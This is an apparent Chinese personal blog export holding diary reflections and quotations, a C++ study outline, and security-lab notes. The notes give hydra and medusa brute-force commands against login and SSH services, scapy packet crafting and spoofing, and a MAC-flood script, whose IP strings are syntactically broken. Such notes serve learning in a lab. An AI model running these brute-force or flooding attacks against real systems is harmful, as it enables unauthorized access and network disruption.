id="section-12">2023-02-01</h3><p><code>今天想学习贺炜的解说名句</code></p><ul><li>但是生活中往往就是这样，一件不经意的小事，经常就是命运的转折，一次看似普通的再见，其实就是永别！缘分就在那一个瞬间戛然而止</li><li>人的一生中最光辉的一天，并非是功成名就的那天，而是从悲叹与绝望对人生的挑战、以勇敢迈向意志那一天。</li><li>生活可能不会你想象的那么好，但是也不会像你想象的那么糟。人的脆弱和坚强，都超乎了自己的想象，有时候脆弱的一句话就泪流满面，有时候你你发现自己咬着牙已经走过了一段很长的路。</li><li>我想真正的成熟应该不是追求完美，而是直面自己的缺憾，这才是生活的本质。罗曼罗兰曾经说过的：“这个世界上只有一种真正的英雄主义，那就是认清生活的真相并且仍然热爱它。</li></ul><hr /><ul><li>每天坚持训练是必须的，记住这种感觉、这种心理</li><li>今天出手一次还是行的，感觉比以前进步大，虽然是失败的一次出手</li><li>增加出手次数是必须的</li></ul><h3 id="section-13">2023-01-28</h3><ul><li>准确判断与任何人之间的关系，谨慎与思考，不断提醒自己换位思考。</li><li>还需要更高的境界与能力、更好的思维、更好的心态才能处理好更多的事情。</li><li>自力更生，何时能做到？此刻，现在。</li><li>如果一件事让人心乱，那么此刻尽量避免做其他事。</li></ul><h3 id="section-14">2023-01-23</h3><ul><li>她以绝美之姿行来, 犹如夜晚。----- 拜伦</li><li>读史使人明智，读诗使人灵秀，数学使人周密，科学使人深刻，伦理学使人庄重，逻辑修辞使人善辩，凡有所学，皆成性格。-----培根</li><li>当你为错过太阳而哭泣的时候，你也要错过群星了。-----泰戈尔</li></ul><hr /><ul><li>让我在除夕夜回忆起那件事并不是一件愉快的事，可我却回忆出了一幕幕从前，还描述了出来。讲完这个故事，我的内心自然无法平静。<ul><li>不过于我而言，这真的只是一件小事。</li><li>希望我的故事能帮到我的兄弟朋友吧。</li></ul></li></ul><hr /><ul><li>更多的平静，更多的思考。</li></ul><h3 id="section-15">2023-01-18</h3><ul><li>假使我又遇见了你，隔着悠长的岁月，我如何致意？以沉默，以眼泪。《春逝》</li></ul><blockquote><p><strong>When We Two Parted《昔日依依别》</strong>----- 拜伦</p><p><strong>陈锡麟译</strong></p><p>When we two parted 昔日依依惜别，</p><p>In silence and tears， 泪流默默无言；</p><p>Half broken-hearted 离恨肝肠断；</p><p>To serve for years， 此别又几年。</p><p>Pale grew thy cheek and cold， 冷颊向愕然，</p><p>Colder thy kiss， 一吻寒更添；</p><p>Truly that hour foretold 日后伤心事，</p><p>Sorrow to this！ 此刻已预言。</p><p>The dew of the morning 朝起寒露重，</p><p>Suck chill or my brow 凛冽凝眉间</p><p>It felt like the warning 彼时已预告：</p><p>Of what I feel now． 悲伤在今天。</p><p>Thy cows are all broken， 山盟今安在？</p><p>And light is thy fame； 汝名何轻贱！</p><p>I hear thy name spoken， 吾闻汝名传，</p><p>And share in its shame． 羞愧在人前。</p><p>They name thee before me， 闻汝名声恶，</p><p>A knell to mine ear； 犹如听丧钟。</p><p>A shudder comes o'er me 不禁心怵惕</p><p>Why wert thou so dear？ 往昔情太浓。</p><p>Thy know not I knew thee 谁知旧日情，</p><p>who knew thee too well： 斯人知太深。</p><p>Long，Long shall I rue thee 绵绵长怀恨，</p><p>Too deeply to tell． 尽在不言中。</p><p>In secret we met— 昔日喜幽会，</p><p>In silence I grieve 今朝恨无声。</p><p>That thy heart could forget， 旧情汝已忘，</p><p>Thy spirit deceive． 痴心遇薄幸。</p><p>If I should meet thee 多年惜别后，</p><p>After long years， 抑或再相逢，</p><p>How should I greet thee ？ 相逢何所语？</p><p>With silence and tears． 泪流默无声。</p></blockquote><ul><li></li></ul><h3 id="section-16">2023-04-01</h3><ul><li>训练，必须得训练，熟悉各种情况、场合下，如何调整自己的心态去开场。</li><li>很久没实践非常容易怯场。</li><li>必须将这件事刻在心中，就像吃饭睡觉一样，成为我正常的生理反应。</li><li>每天洗脸时，问自己，我今天应当以怎样的状态去做事、去与人交流。</li><li>与上面一样重要的是：我必须将自己的心理健康与强壮身体视为每天必须谨记的事。</li><li>走出房间，多看看外面的世界。</li></ul><h3 id="section-17">2023-01-16</h3><ul><li>爱所有人，信任少数人，不负任何人。----- 莎士比亚</li><li>在灰暗的日子里，不要让冷酷的命运窃喜；命运既然来凌辱我们，就应该用处之泰然的态度予以报复。-----莎士比亚</li><li>虽也饮酒，但不沉湎；虽也满足欲望，但适可而止。----- 《十日谈》</li><li>征服你自己，而不要征服全世界。----- 《笛卡尔》</li><li>谦虚对才华绝顶的人来说是一种虚伪。------ 《叔本华》</li><li>生活就像海洋，只有意志坚强的人才能到达彼岸。----- 《马克思》</li></ul><hr /><ul><li></li></ul><h3 id="section-18">2023-01-14</h3><ul><li>外表的美只能取悦于人的眼睛，而内在的美却能感染人的灵魂。------伏尔泰<ul><li>体会：见到美女，无可厚非会多盯几眼，但是似乎也仅限于生理反应；而真正一个人格魅力吸引我的人，我会对她产生敬意和尊敬，如果是女人的特质，则可能会产生朦胧的爱意。</li><li>但又不完全赞成：任何一个人都应该注意自己的穿着和外表，这也会是一个人人格魅力的外漏，作为男生，精气神是必须要有的。</li></ul></li><li>白昼之光，岂知夜色之深。------尼采<ul><li>夏虫不可语冰</li></ul></li><li>世界弥漫着焦躁不安的气息，因为每一个人都急于从自己的枷锁中解放出来。------尼采</li><li>简洁是智慧的灵魂，冗长是肤浅的藻饰。------ 莎士比亚</li></ul><hr /><ul><li>平静</li><li>对于一个从小追求学习成绩优异，无论何事都力争上游、争强好胜、且缺乏爱的教育的人来说学会表达自己的爱是一件不容易的事。</li><li>前几天跟前台一个妹子闲聊了几句：服务态度很好，跟我这个陌生人也会说玩笑话，性格很好，像是来自西北。<ul><li>今天电梯遇到，主动跟我打招呼，还主动找话题聊天说话，就感觉她性格蛮好，蛮有趣。</li></ul></li><li>最近喜欢在凌晨思考很多东西，甚至学习计算机。</li><li>如何能准确地表达自己呢，这是一门需要认真学习的学问。<ul><li>交流、沟通是如此的重要，你总不能让人误解吧。尤其是换位思考。</li><li>不紧不慢，思考，平静。</li><li>出现矛盾与分歧或者令人惊讶的言行，首先应当将其合理化，去思考原因，或许这个世界更多需要的是感同身受。</li></ul></li><li>你是我这一生想要的美丽女人</li><li>你是我这一辈子最难忘的人</li><li>还怎么可能，变得那么得残忍</li></ul><h3 id="section-19">2023-01-11</h3><ul><li>如果觉得做某件事/某个动作很累，那么就每天重复，刻在自然反应里。</li><li>从今天开始想每天读一首诗词/名句</li></ul><h3 id="section-20">2023-01-06</h3><ul><li>当沉迷于其他事情的时候，就会忽略其他事情</li><li>如果每天不能给自己点时间去思考其它或者发呆，我会很累，睡不好，进而失去自己身上的特质</li><li>人际关系管理</li><li>应当常常想想能为自己身边的人做些什么，能为他人做些什么。</li><li>换位思考，而不是一味随性</li><li>任何时候，都要凶狠自信，抬头挺胸，脚踏实地的走路，精气神！</li></ul><h3 id="section-21">2022-12-20</h3><ul><li>我想定居在南京/长三角/珠三角</li></ul><h3 id="section-22">2022-12-16</h3><ul><li>再也不想将自己的命运交在他人的手里，这个过程都是如此的忐忑</li><li>如何喜欢上一件事物，那就是投入，先不抗拒，尝试接受，多互动，获取成就感。</li></ul><h3 id="section-23">2022-12-13</h3><ul><li>首先感谢ryan,解放了我的思想，让我拥有了更加广阔的格局。</li><li>这段时间走错了方向</li><li>我仍然在想如何实现自己的价值：帮助他人？积累财富？继续锻炼社交？</li></ul><h3 id="section-24">2022-09-26</h3><ul><li>晚上去了趟南教5</li><li>这个晚上非常自信与自然</li><li>感觉到了自己巨大的改变</li><li>为何之前出手一直唯唯诺诺呢，我想大概是缺乏必要的理论、更重要的是实践。</li><li>对于游戏，一玩游戏就容易上头，直接连续玩10小时/天、一个月以上吧，玩久了身心不适，游戏于我而言就像毒品。</li></ul><hr /><ul><li>自我尊重</li><li>万事万物树立正确的价值观</li><li>信念、认知、价值观、心态、思维、性格、特质精神</li><li>认识问题、提升自我</li><li>凡事不要追求过高的预期、保持自然与平衡的心态</li><li>也不要给他人过高的预期</li></ul><h3 id="section-25">2022-09-12</h3><blockquote><ul><li>给予</li></ul></blockquote><h3 id="section-26">2022-09-11</h3><blockquote><ul><li>何为自信呢：<ul><li>是面对事情时的一种本能的心态，不掩饰，不怀疑。</li><li>引领</li><li>眼神</li><li>肢体</li><li>语速</li></ul></li></ul></blockquote><h3 id="section-27">2022-09-10</h3><blockquote><ul><li>正气凛然</li><li>什么是我能控制的，又有什么是我不能掌控的</li></ul></blockquote><h3 id="section-28">2022-09-09</h3><blockquote><ul><li>事情都在按着一种趋势在发展，似乎于我来说不可逆转</li></ul></blockquote><h3 id="section-29">2022-09-06</h3><blockquote><ul><li>A1pha</li></ul></blockquote><blockquote><ul><li>平静（任何时候）</li><li>说话过脑</li><li>不仅不慢</li><li>思考</li></ul></blockquote><h3 id="section-30">2022-09-03</h3><blockquote><ul><li>人性</li></ul></blockquote><h3 id="section-31">2022-09-02</h3><blockquote><ul><li>标准</li><li>双赢</li></ul></blockquote><h3 id="section-32">2022-08-31</h3><blockquote><ul><li>信念与认知</li><li>自然之道</li></ul></blockquote><blockquote><ul><li>AlphaMan</li></ul></blockquote><h3 id="section-33">2022-08-20</h3><blockquote><ul><li>当我平静时，我感觉我很强</li></ul></blockquote><blockquote><ul><li>遇到问题：冷静、思考，思考来龙去脉、分析原因，思考本质</li></ul></blockquote><blockquote><ul><li>最近在想一个问题：怎么能发现自己的缺陷与弱点呢<ul><li>吾日三省吾身</li><li>让他人指正</li><li>多做事、多解决问题</li><li>看书</li></ul></li></ul></blockquote><blockquote><ul><li>波澜不惊、不紧不慢</li><li><code>union</code></li></ul></blockquote><h3 id="及之前">2022-08-09及之前</h3><blockquote><p>学习一门知识，首先找准重点学习，然后实践补齐枝叶（因为单纯枝叶的学习实在无聊透顶）</p></blockquote><blockquote><p>学会思考，无论是无法接受与释怀的，还是失败的，还是成功的，无论利弊，学会思考，思考人、思考事</p></blockquote><blockquote><p>野心、平静与耐心</p></blockquote><blockquote><p>想要变得更好，就必须跳出舒适圈，做以前没做过的事，做令自己难受的事，突破舒适圈才能拥有更大的舒适圈</p></blockquote><blockquote><p><strong>关于北林失利：</strong>于我而言，确实是一件好事，感觉会是我的一个转折点。</p><ul><li>全面、细致、谨慎，无论做什么事，想要尽可能地成功，应当<code>理论+实践</code>，并拥有超出解决这件事本身的水平，形成降维打击。</li></ul></blockquote><blockquote><p><strong>关于2021-07</strong>：凡事预则立，不预则废。我想不仅如此：我应当具备超出当前问题本身之上的水平，无论何事，我都需要学习：<code>理论+实践</code>。全面、细致、谨慎</p></blockquote><blockquote><p>linux下一切皆文件，而世间一切皆学问</p></blockquote><blockquote><p><strong>怎样才算MAN？</strong>我想：强健的体魄、责任感、遇事冷静与沉着、自信略带自负、有野心、不对任何人有依赖能算吧。</p><p><code>health</code>、<code>treasure</code>、<code>high value</code>and <code>Love</code></p></blockquote><blockquote><p>似乎每一次痛的洗礼后，都会变得更强</p></blockquote><blockquote><p>强者自救、圣者渡人。</p></blockquote><blockquote><p>说每一句话、做每一件事的初心</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Easygoing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++侯捷</title>
      <link href="/2022/08/08/c-hou-jie/"/>
      <url>/2022/08/08/c-hou-jie/</url>
      
        <content type="html"><![CDATA[<h3 id="面向对象">面向对象</h3><ol type="1"><li><code>new</code> 与 <code>delete</code></li><li><code>array new</code> 搭配 <code>array delete</code></li></ol><figure><img src="https://s2.loli.net/2022/08/09/eA6gYpHXLSIty72.png"alt="image-20220809130122231" /><figcaption aria-hidden="true">image-20220809130122231</figcaption></figure><ol start="3" type="1"><li><code>inline</code></li><li><code>引用</code></li><li><code>string</code>类源码</li><li>单例模式</li><li>类的设计：<code>private</code>与 <code>public</code></li><li><code>class with pointer</code></li><li>has-a :</li></ol><blockquote><ol type="1"><li>has-a : by <code>reference</code></li></ol></blockquote><ol start="10" type="1"><li><p>内存：堆栈</p></li><li><p>浅拷贝与深拷贝</p></li><li><p>引用还是传值</p></li><li><p>是否<code>const</code></p></li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> Programming Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python攻击脚本</title>
      <link href="/2022/08/08/python-gong-ji-jiao-ben/"/>
      <url>/2022/08/08/python-gong-ji-jiao-ben/</url>
      
        <content type="html"><![CDATA[<h3 id="加密解密实战">加密解密实战</h3><ol type="1"><li><code>base64</code>编码</li><li>哈希算法：不可逆</li><li>凯撒密码</li></ol><h3 id="模拟勒索病毒">模拟勒索病毒</h3><ol type="1"><li><code>base64</code>编码再加密</li><li><code>wnana cry</code></li></ol><h3 id="质数因子求解">质数因子求解</h3><h3 id="rsa与aes解密">RSA与AES解密</h3><ol type="1"><li><code>https:</code> SHA,RSA,AES</li><li>对称加密：AES,DES,RC5</li></ol><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># 如果下载了多个密码学库，则卸载所有，安装最新的一个 </span>pip uninstall crypto pip uninstall pycryptodomepip install pycryptodome</code></pre><h3 id="爆破woniusales系统">爆破woniusales系统</h3><ol type="1"><li>爆破md5</li><li>多线程</li></ol><blockquote><ol type="1"><li>一线程一用户</li><li>一线程多用户</li></ol></blockquote><ol start="3" type="1"><li>工具</li></ol><blockquote><ol type="1"><li><code>hydra</code></li></ol></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-h</span>hydra <span class="token parameter variable">-s</span> <span class="token number">8080</span> <span class="token parameter variable">-l</span> admin <span class="token parameter variable">-P</span> ./password-3000.txt <span class="token number">192.168</span>.112.130 <span class="token parameter variable">-m</span> <span class="token string">"/woniusales/user/login:username=^USER^&amp;password=^PASS^&amp;verifycode=0000:login-fail"</span> http-form-post</code></pre><figure><img src="https://s2.loli.net/2022/08/08/k8tY97DIjx4wiRZ.png"alt="hydra" /><figcaption aria-hidden="true">hydra</figcaption></figure><pre class="language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> root <span class="token parameter variable">-P</span> ./password-3000.txt <span class="token parameter variable">-vV</span> <span class="token parameter variable">-o</span> ssh.log <span class="token parameter variable">-e</span> ns <span class="token number">192.168</span>.112.118 <span class="token function">ssh</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">medusa <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.112.188 <span class="token parameter variable">-u</span> root <span class="token parameter variable">-p</span> ./password-3000.txt <span class="token parameter variable">-t</span> <span class="token number">200</span> <span class="token parameter variable">-M</span> <span class="token function">ssh</span></code></pre><blockquote><ol start="2" type="1"><li><code>medusa</code></li></ol></blockquote><figure><img src="https://s2.loli.net/2022/08/12/8aCiMbTq1ZXrKlN.png"alt="medusa" /><figcaption aria-hidden="true">medusa</figcaption></figure><blockquote><ol start="3" type="1"><li>字典生成工具 <code>crunch</code></li><li><code>du -sh</code>命令</li></ol></blockquote><h3 id="python-扫描可用端口">python 扫描可用端口</h3><ol type="1"><li>尝试连接目标ip和端口（socket）</li></ol><h3 id="python扫描ip地址">python扫描ip地址</h3><ol type="1"><li>使用<code>ping</code>, <code>import os</code></li></ol><pre class="language-powershell" data-language="powershell"><code class="language-powershell">ping <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">|</span> findstr TTL</code></pre><blockquote><p>注意防火墙</p></blockquote><h3 id="scapy-kali-上也有">scapy: kali 上也有</h3><ol type="1"><li>监听流量、分析流量、编辑流量数据包（链路层、网络层、传输层</li></ol><pre class="language-powershell" data-language="powershell"><code class="language-powershell">show_interfaces<span class="token punctuation">(</span><span class="token punctuation">)</span>pack=sniff<span class="token punctuation">(</span>count=10<span class="token punctuation">,</span>iface=<span class="token string">'VMware Virtual Ethernet Adapter for VMnet8'</span><span class="token punctuation">)</span>pack<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><figure><img src="https://s2.loli.net/2022/08/12/qHMoxSUEKaYcXRN.png"alt="image-20220809202221278" /><figcaption aria-hidden="true">image-20220809202221278</figcaption></figure><pre class="language-powershell" data-language="powershell"><code class="language-powershell">pack<span class="token punctuation">.</span>summary<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><figure><img src="https://s2.loli.net/2022/08/09/1LFsnJxogDHByfq.png"alt="image-20220809203824463" /><figcaption aria-hidden="true">image-20220809203824463</figcaption></figure><p>​</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">send<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst=<span class="token string">"192.168.104.129"</span><span class="token punctuation">)</span><span class="token operator">/</span>ICMP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># 带载荷</span>send<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst=<span class="token string">"192.168.104.129"</span><span class="token punctuation">)</span><span class="token operator">/</span>ICMP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token string">"HHHHHHHHHHHHHH"</span><span class="token punctuation">)</span></code></pre><p>​</p><pre class="language-python" data-language="python"><code class="language-python">send<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"192.168.104.129"</span><span class="token punctuation">)</span><span class="token operator">/</span>ICMP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token string">"HHHHHHHH"</span><span class="token punctuation">,</span>inter<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>count<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span></code></pre><pre class="language-python" data-language="python"><code class="language-python">pkg<span class="token operator">=</span>sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"192.168.104.129"</span><span class="token punctuation">)</span><span class="token operator">/</span>ICMP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token string">"HHHHHHHHHJH"</span><span class="token punctuation">)</span></code></pre><pre class="language-python" data-language="python"><code class="language-python">IP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class="language-python" data-language="python"><code class="language-python">pkg <span class="token operator">=</span> IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">'192.168.104.129'</span><span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">)</span>sr1<span class="token punctuation">(</span>pkg<span class="token punctuation">)</span></code></pre><figure><img src="https://s2.loli.net/2022/08/12/78QAoSVuz1Ihv2E.png"alt="image-20220809224546860" /><figcaption aria-hidden="true">image-20220809224546860</figcaption></figure><blockquote><p>python <code>ip欺骗</code></p></blockquote><figure><img src="https://s2.loli.net/2022/08/09/ytXr9K351qf7bMO.png"alt="image-20220809225218540" /><figcaption aria-hidden="true">image-20220809225218540</figcaption></figure><ol start="2" type="1"><li>py 模拟三次握手</li></ol><figure><img src="https://s2.loli.net/2022/08/10/b7xqpc8rdoZBSgm.png"alt="image-20220810160403719" /><figcaption aria-hidden="true">image-20220810160403719</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/10/O8eyBCP5vwjmsdk.png"alt="image-20220810160425563" /><figcaption aria-hidden="true">image-20220810160425563</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/10/2JTyi5g1UbEuPxQ.png"alt="image-20220810160144705" /><figcaption aria-hidden="true">image-20220810160144705</figcaption></figure><h3 id="nmap">nmap</h3><pre class="language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sn</span> 网段/地址范围</code></pre><figure><img src="https://s2.loli.net/2022/08/10/LKekJzNAhCGtsrB.png"alt="image-20220810164036582" /><figcaption aria-hidden="true">image-20220810164036582</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/12/yBxKPcnDYeg7SJh.png"alt="image-20220810165955081" /><figcaption aria-hidden="true">image-20220810165955081</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/12/kJiayMhHScPpbYr.png"alt="image-20220810173601244" /><figcaption aria-hidden="true">image-20220810173601244</figcaption></figure><ul><li>绕过防火墙</li></ul><h3 id="子域名和后台扫描">子域名和后台扫描</h3><ol type="1"><li>layer子域挖掘机（<code>windows</code></li><li>dnsenum(<code>kali</code>)</li></ol><figure><img src="https://s2.loli.net/2022/08/10/aHpRun7MTmSG4tv.png"alt="image-20220810182403401" /><figcaption aria-hidden="true">image-20220810182403401</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/12/gZeO9Ruphqy8vnw.png"alt="image-20220810182442749" /><figcaption aria-hidden="true">image-20220810182442749</figcaption></figure><ol type="1"><li>后台扫描(扫描网站文件、目录)</li></ol><blockquote><ul><li>御剑</li></ul></blockquote><blockquote><ul><li><code>dirbuster</code></li></ul></blockquote><figure><img src="https://s2.loli.net/2022/08/10/ORfEi3pCkzYvdLr.png"alt="image-20220810202520815" /><figcaption aria-hidden="true">image-20220810202520815</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/10/qxBl9fLwybZpCa3.png"alt="https://s2.loli.net/2022/08/10/qxBl9fLwybZpCa3.png" /><figcaptionaria-hidden="true">https://s2.loli.net/2022/08/10/qxBl9fLwybZpCa3.png</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/10/dyBRc79oq6kzsKI.png"alt="image-20220810201838607" /><figcaption aria-hidden="true">image-20220810201838607</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/10/LjMRVGwWNOsg6mh.png"alt="image-20220810201733159" /><figcaption aria-hidden="true">image-20220810201733159</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/10/3mUzByLHh6f5MtN.png"alt="image-20220810201939575" /><figcaption aria-hidden="true">image-20220810201939575</figcaption></figure><h3 id="web站点信息采集">web站点信息采集</h3><figure><img src="https://s2.loli.net/2022/08/10/mVazoqSvWjLy3uE.png"alt="https://s2.loli.net/2022/08/10/mVazoqSvWjLy3uE.png" /><figcaptionaria-hidden="true">https://s2.loli.net/2022/08/10/mVazoqSvWjLy3uE.png</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/10/XG2rzkRtsujADVy.png"alt="image-20220810203827981" /><figcaption aria-hidden="true">image-20220810203827981</figcaption></figure><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># pyton-whois 库</span><span class="token keyword">from</span> whois <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">whois_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> whois<span class="token punctuation">(</span><span class="token string">'woniuxy.com'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><figure><img src="https://s2.loli.net/2022/08/10/LYZBXAivP91wjdb.png"alt="nslookup" /><figcaption aria-hidden="true">nslookup</figcaption></figure><blockquote><p><code>cdn</code>: 多个ip</p></blockquote><blockquote><p><code>fafa.so</code>搜索引擎：<ahref="https://fofa.info/toLogin">click</a></p></blockquote><blockquote><p><a href="https://www.shodan.io/">shodan</a></p></blockquote><h3 id="泛洪">泛洪</h3><ol type="1"><li>TCP_land</li></ol><blockquote><ul><li>源地址和目标地址相同</li><li>反射型攻击</li><li>ICMP广播</li><li>ping 命令泛洪</li><li>MAC地址泛洪</li></ul></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash">kali:macof</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">import</span> randmac<span class="token keyword">from</span> scapy<span class="token punctuation">.</span>layers<span class="token punctuation">.</span>l2 <span class="token keyword">import</span> Ether<span class="token keyword">from</span> scapy<span class="token punctuation">.</span>volatile <span class="token keyword">import</span> RandMAC<span class="token keyword">def</span> <span class="token function">mac_flood</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        randMac <span class="token operator">=</span> RandMAC<span class="token punctuation">(</span><span class="token string">"*:*:*:*"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>randMac<span class="token punctuation">)</span>        srandip <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        drandip <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        packet <span class="token operator">=</span> Ether<span class="token punctuation">(</span>src<span class="token operator">=</span>randMac<span class="token punctuation">,</span> dst<span class="token operator">=</span>randMac<span class="token punctuation">)</span><span class="token operator">/</span>IP<span class="token punctuation">(</span>src<span class="token operator">=</span>srandip<span class="token punctuation">,</span> dst<span class="token operator">=</span>drandip<span class="token punctuation">)</span>        sendp<span class="token punctuation">(</span>packet<span class="token punctuation">,</span> iface<span class="token operator">=</span><span class="token string">"网卡名称"</span><span class="token punctuation">,</span> loop<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><ol start="2" type="1"><li><code>vmWare</code>中的混杂模式</li></ol><pre class="language-none"><code class="language-none">ethernet0.noPromsic &#x3D; &quot;TRUE&quot;    # 禁用</code></pre><h3 id="arp攻击与欺骗">ARP攻击与欺骗</h3><pre class="language-bash" data-language="bash"><code class="language-bash">root <span class="token parameter variable">-n</span>  <span class="token comment"># 查看网关</span></code></pre><blockquote><ul><li>kali (.129)攻击 win10(.131)</li></ul></blockquote><figure><img src="https://s2.loli.net/2022/08/11/pI9W4N3KzcgASnY.png"alt="image-20220811153941380" /><figcaption aria-hidden="true">image-20220811153941380</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/12/FsxaVymDh6PMvWU.png"alt="image-20220811155511118" /><figcaption aria-hidden="true">image-20220811155511118</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/11/mOpiLMtr3lVjbe6.png"alt="https://s2.loli.net/2022/08/11/mOpiLMtr3lVjbe6.png" /><figcaptionaria-hidden="true">https://s2.loli.net/2022/08/11/mOpiLMtr3lVjbe6.png</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/11/H8QFqMz3tPup1Jb.png"alt="image-20220811161453521" /><figcaption aria-hidden="true">image-20220811161453521</figcaption></figure><blockquote><ul><li>kali 上开启ipv4 转发</li></ul></blockquote><blockquote><p><code>driftnet</code>: 从发过来的流量中捕获图像并显示</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">from</span> scapy<span class="token punctuation">.</span>sendrecv <span class="token keyword">import</span> sendp<span class="token keyword">import</span> random<span class="token keyword">import</span> randmac<span class="token keyword">from</span> scapy<span class="token punctuation">.</span>layers<span class="token punctuation">.</span>l2 <span class="token keyword">import</span> Ether<span class="token punctuation">,</span> ARP<span class="token keyword">from</span> scapy<span class="token punctuation">.</span>volatile <span class="token keyword">import</span> RandMAC<span class="token keyword">def</span> <span class="token function">mac_flood</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        randMac <span class="token operator">=</span> RandMAC<span class="token punctuation">(</span><span class="token string">"*:*:*:*"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>randMac<span class="token punctuation">)</span>        srandip <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token 